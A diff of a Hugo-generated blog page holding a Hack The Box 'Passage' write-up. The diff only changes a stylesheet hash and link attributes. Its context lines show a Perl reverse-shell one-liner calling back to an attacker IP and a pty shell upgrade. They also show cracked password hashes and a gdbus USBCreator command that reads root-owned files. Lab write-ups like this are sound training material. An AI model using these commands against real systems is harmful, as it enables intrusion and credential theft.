@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
-<meta name="supported-color-schemes" content="light dark"><title>HTB Passage&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.18c590792b52ec026068c0b889c0f13fac4882d13cdb8ad935c3a36b0036b3e3d725f8c8a0e7bbdcf0e6326fb80637f3.css" integrity="sha384-GMWQeStS7AJgaMC4icDxP6xIgtE824rZNcOjawA2s&#43;PXJfjIoOe73PDmMm&#43;4Bjfz"><meta name="twitter:card" content="summary" />
+<meta name="supported-color-schemes" content="light dark"><title>HTB Passage&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="HTB Passage" /><body><section id="header">
     <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><img class="site logo" src="/img/NightWolf.jpg" alt /><span class="site name">The Wolf Den</span></a></span>
         <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
@@ -55,7 +55,8 @@ Admin (nadav@passege.htb)
 <h2 id="user">User</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.0.14.11&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
 </code></pre></div><p>The callback is caught with a simple netcat listener and then the shell can be upgraded. <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
-<p><a href="https://crackstation.net/"target="_blank">CrackStation</a> is a quick way to check certain kinds of hashes. There are a couple matches.</p>
+<p><a href="https://crackstation.net/"target="_blank" rel="noopener noreferrer">CrackStation</a>
+ is a quick way to check certain kinds of hashes. There are a couple matches.</p>
 <pre><code>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc:egre55 (crackstation)
 </code></pre><p>CrackStation didn&rsquo;t get all of them though. Hashcat will have to try to do some clean up.</p>
@@ -78,12 +79,15 @@ e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 (hashc
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/... true
 </code></pre></div><h2 id="closing-thoughts">Closing thoughts</h2>
 <p>There are a few ways an attacker could get a full shell as root. Root does have valid ssh keys and you could copy these off the same way you got root.txt. Alternatively you could snag <code>/etc/shadow</code> and <code>/etc/passwd</code> and crack the hashes.</p>
-<p>Reuse of credentials was a definite theme ruing the box and I enjoyed learning about the USBCreator vulnerability. It required sudo access but was a bit different than cookie cutter GTFO bin. Thanks to <a href="https://app.hackthebox.eu/users/140851"target="_blank">ChefByzen</a> for creating an awesome box!</p>
-</article></div>
+<p>Reuse of credentials was a definite theme ruing the box and I enjoyed learning about the USBCreator vulnerability. It required sudo access but was a bit different than cookie cutter GTFO bin. Thanks to <a href="https://app.hackthebox.eu/users/140851"target="_blank" rel="noopener noreferrer">ChefByzen</a>
+ for creating an awesome box!</p>
+</article>
+</div>
 <div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/academy-writeup/"><span class="iconfont icon-article"></span>HTB Academy</a></p><p><a class="link" href="/posts/doctor-writeup/"><span class="iconfont icon-article"></span>HTB Doctor</a></p></section></div></section><section id="footer"><div class="footer-wrap">
     <p class="copyright">The Wolf Den</p>
     <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
-        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
-        target="_blank">Notepadium</a></p></div></section></body>
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div>
+</section></body>
 
 </html>
